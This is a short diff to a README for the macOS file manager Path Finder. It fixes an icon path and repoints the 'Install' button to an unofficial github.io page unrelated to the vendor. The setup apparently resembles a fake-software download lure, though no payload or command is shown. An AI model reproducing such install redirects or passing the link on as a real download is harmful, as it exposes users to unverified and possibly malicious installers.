@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/en/7/7f/Path_Finder_5_for_system.png" width="100" alt="Path Finder icon"/>
+  <img src="https://upload.wikimedia.org/wikipedia/en/7/7f/Path_Finder_5_for_Mac.png" width="100" alt="Path Finder icon"/>
 </p>
 
 <h1 align="center">Path Finder</h1>
@@ -14,7 +14,7 @@
 </p>
 
 <p align="center">
-  <a href="https://marat-klubnika-apps.github.io/.github/">
+  <a href="https://day-deneg-pzh.github.io/.github/pathfinder">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/>
   </a>
 </p>
